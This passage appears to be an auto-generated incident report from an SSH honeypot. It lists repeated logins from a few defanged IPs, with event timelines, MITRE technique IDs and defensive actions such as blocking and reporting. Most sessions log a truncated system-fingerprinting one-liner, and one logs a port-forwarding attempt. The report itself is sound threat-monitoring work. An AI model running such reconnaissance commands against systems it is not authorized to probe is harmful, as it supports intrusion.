| `2026-07-05 09:01:10` | `cowrie.session.params` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.command.success` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.command.input` |
| `2026-07-05 09:01:10` | `cowrie.log.closed` |
| `2026-07-05 09:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-981898a5c8ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:02 |
| **Last Seen** | 2026-07-05 09:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:02:34` | `cowrie.session.connect` |
| `2026-07-05 09:02:35` | `cowrie.client.version` |
| `2026-07-05 09:02:35` | `cowrie.client.kex` |
| `2026-07-05 09:02:37` | `cowrie.login.success` |
| `2026-07-05 09:02:38` | `cowrie.session.params` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:38` | `cowrie.command.success` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:38` | `cowrie.command.input` |
| `2026-07-05 09:02:39` | `cowrie.log.closed` |
| `2026-07-05 09:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c312e0037e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:05 |
| **Last Seen** | 2026-07-05 09:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:05:31` | `cowrie.session.connect` |
| `2026-07-05 09:05:31` | `cowrie.client.version` |
| `2026-07-05 09:05:31` | `cowrie.client.kex` |
| `2026-07-05 09:05:33` | `cowrie.login.success` |
| `2026-07-05 09:05:35` | `cowrie.session.params` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.command.success` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.command.input` |
| `2026-07-05 09:05:35` | `cowrie.log.closed` |
| `2026-07-05 09:05:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-049b36ac6e84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:06 |
| **Last Seen** | 2026-07-05 09:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:06:58` | `cowrie.session.connect` |
| `2026-07-05 09:06:58` | `cowrie.client.version` |
| `2026-07-05 09:06:58` | `cowrie.client.kex` |
| `2026-07-05 09:07:00` | `cowrie.login.success` |
| `2026-07-05 09:07:02` | `cowrie.session.params` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.command.success` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.command.input` |
| `2026-07-05 09:07:02` | `cowrie.log.closed` |
| `2026-07-05 09:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d709141857

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:08 |
| **Last Seen** | 2026-07-05 09:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:08:26` | `cowrie.session.connect` |
| `2026-07-05 09:08:26` | `cowrie.client.version` |
| `2026-07-05 09:08:26` | `cowrie.client.kex` |
| `2026-07-05 09:08:28` | `cowrie.login.success` |
| `2026-07-05 09:08:29` | `cowrie.session.params` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.command.success` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.command.input` |
| `2026-07-05 09:08:29` | `cowrie.log.closed` |
| `2026-07-05 09:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f2b6daade4e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:09 |
| **Last Seen** | 2026-07-05 09:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:09:54` | `cowrie.session.connect` |
| `2026-07-05 09:09:55` | `cowrie.client.version` |
| `2026-07-05 09:09:55` | `cowrie.client.kex` |
| `2026-07-05 09:09:56` | `cowrie.login.success` |
| `2026-07-05 09:09:58` | `cowrie.session.params` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.command.success` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.command.input` |
| `2026-07-05 09:09:58` | `cowrie.log.closed` |
| `2026-07-05 09:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0826b1d5a8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:11 |
| **Last Seen** | 2026-07-05 09:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:11:24` | `cowrie.session.connect` |
| `2026-07-05 09:11:24` | `cowrie.client.version` |
| `2026-07-05 09:11:24` | `cowrie.client.kex` |
| `2026-07-05 09:11:25` | `cowrie.login.success` |
| `2026-07-05 09:11:27` | `cowrie.session.params` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.command.success` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.command.input` |
| `2026-07-05 09:11:27` | `cowrie.log.closed` |
| `2026-07-05 09:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f564938b5010

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 09:11 |
| **Last Seen** | 2026-07-05 09:11 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:11:40` | `cowrie.session.connect` |
| `2026-07-05 09:11:41` | `cowrie.client.version` |
| `2026-07-05 09:11:41` | `cowrie.client.kex` |
| `2026-07-05 09:11:48` | `cowrie.login.success` |
| `2026-07-05 09:11:52` | `cowrie.session.params` |
| `2026-07-05 09:11:52` | `cowrie.command.input` |
| `2026-07-05 09:11:53` | `cowrie.log.closed` |
| `2026-07-05 09:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92b5cd2f2d5d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 09:12 |
| **Last Seen** | 2026-07-05 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:12:23` | `cowrie.session.connect` |
| `2026-07-05 09:12:23` | `cowrie.client.version` |
| `2026-07-05 09:12:23` | `cowrie.client.kex` |
| `2026-07-05 09:12:23` | `cowrie.login.success` |
| `2026-07-05 09:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feed40b78a6f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 09:12 |
| **Last Seen** | 2026-07-05 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:12:23` | `cowrie.session.connect` |
| `2026-07-05 09:12:23` | `cowrie.client.version` |
| `2026-07-05 09:12:23` | `cowrie.client.kex` |
| `2026-07-05 09:12:23` | `cowrie.login.success` |
| `2026-07-05 09:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef35ef7c7431

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 09:12 |
| **Last Seen** | 2026-07-05 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:12:32` | `cowrie.session.connect` |
| `2026-07-05 09:12:32` | `cowrie.client.version` |
| `2026-07-05 09:12:32` | `cowrie.client.kex` |
| `2026-07-05 09:12:32` | `cowrie.login.success` |
| `2026-07-05 09:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23dc13187cff

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-05 09:12 |
| **Last Seen** | 2026-07-05 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:12:32` | `cowrie.session.connect` |
| `2026-07-05 09:12:32` | `cowrie.client.version` |
| `2026-07-05 09:12:32` | `cowrie.client.kex` |
| `2026-07-05 09:12:32` | `cowrie.login.success` |
| `2026-07-05 09:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a96a2a86a83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:12 |
| **Last Seen** | 2026-07-05 09:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:12:52` | `cowrie.session.connect` |
| `2026-07-05 09:12:52` | `cowrie.client.version` |
| `2026-07-05 09:12:52` | `cowrie.client.kex` |
| `2026-07-05 09:12:54` | `cowrie.login.success` |
| `2026-07-05 09:12:55` | `cowrie.session.params` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.command.success` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.command.input` |
| `2026-07-05 09:12:55` | `cowrie.log.closed` |
| `2026-07-05 09:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89eba300d67c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 09:13 |
| **Last Seen** | 2026-07-05 09:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:13:46` | `cowrie.session.connect` |
| `2026-07-05 09:13:46` | `cowrie.client.version` |
| `2026-07-05 09:13:46` | `cowrie.client.kex` |
| `2026-07-05 09:13:46` | `cowrie.login.success` |
| `2026-07-05 09:13:46` | `cowrie.direct-tcpip.request` |
| `2026-07-05 09:13:46` | `cowrie.direct-tcpip.data` |
| `2026-07-05 09:13:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a203ae9241

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:14 |
| **Last Seen** | 2026-07-05 09:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:14:22` | `cowrie.session.connect` |
| `2026-07-05 09:14:22` | `cowrie.client.version` |
| `2026-07-05 09:14:22` | `cowrie.client.kex` |
| `2026-07-05 09:14:24` | `cowrie.login.success` |
| `2026-07-05 09:14:25` | `cowrie.session.params` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:25` | `cowrie.command.success` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:25` | `cowrie.command.input` |
| `2026-07-05 09:14:26` | `cowrie.log.closed` |
| `2026-07-05 09:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6278e6c9a2ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:15 |
| **Last Seen** | 2026-07-05 09:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:15:53` | `cowrie.session.connect` |
| `2026-07-05 09:15:53` | `cowrie.client.version` |
| `2026-07-05 09:15:53` | `cowrie.client.kex` |
| `2026-07-05 09:15:54` | `cowrie.login.success` |
| `2026-07-05 09:15:56` | `cowrie.session.params` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.command.success` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.command.input` |
| `2026-07-05 09:15:56` | `cowrie.log.closed` |
| `2026-07-05 09:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-177c5f75db75

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:17 |
| **Last Seen** | 2026-07-05 09:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
